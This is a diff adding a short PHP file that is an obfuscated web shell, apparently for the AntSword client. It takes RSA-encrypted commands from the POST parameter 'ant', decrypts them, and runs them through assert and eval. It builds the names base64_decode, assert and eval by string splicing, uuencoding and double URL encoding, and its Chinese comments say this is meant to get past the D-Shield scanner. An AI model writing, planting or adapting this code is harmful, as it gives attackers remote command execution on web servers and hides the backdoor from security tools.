@@ -1,0 +1,44 @@
+<?php
+$cmd = @$_POST['ant'];
+$aa='cmd';
+//将base64解码函数进行拼接替换
+//$ba=base64
+$ba=str_replace("ff","","bffaffsffeff6ff4ff");
+//$ba1=_decode
+$ba1=str_replace("ff","","_ffdffeffcffoffdffeff");
+//拼接成base64_decode
+$ba2=$ba.$ba1;
+//使用D盾进行扫描之后还是会搜索到base64解码函数，再次进行编码
+$ba3=convert_uudecode(convert_uuencode($ba2));
+$pk = <<<EOF
+-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCR6Xy4oMRyfUr55XyXkKEJ+kLG
+mFrtGa9vzqUJQ+POzQ3ZVsq6U2fvEHCkw0DnwI7C+CfXgWt36kcCiW1ND6AipLzT
+kplf4MI01yiZQQfQnpBBUKNMqA66dr3TD09ytX+TZJEsRVfxUDj2XCw752lzzx8A
+VsIytAJwYKUtmp5B3wIDAQAB
+-----END PUBLIC KEY-----
+EOF;
+$cmds = explode("|", $cmd);
+$pk = openssl_pkey_get_public($pk);
+$cmd = '';
+foreach ($cmds as $value) {
+    if (openssl_public_decrypt($ba3($value), $de, $pk)) {
+        $cmd .= $de;
+    }
+}
+
+//assert函数编码
+//ass编码
+$a=convert_uudecode($ba3(convert_uudecode($ba3("LDI3SUcsVFE2MzRNOTA2XF0KYAo="))));
+//ert编码
+$b=convert_uudecode($ba3(convert_uudecode($ba3("LDI3SUssVE02NDRNOTA2XF0KYAo="))));
+//assert拼接
+$c=$a.$b;
+$d=convert_uudecode(convert_uuencode($c));
+
+
+//eval函数的编码，两次url编码
+$ll=urldecode(urldecode("%25%36%35%25%37%36%25%36%31%25%36%63"));
+//echo $ll;
+//assert("eval($cmd)")
+$d("$ll($$aa)");
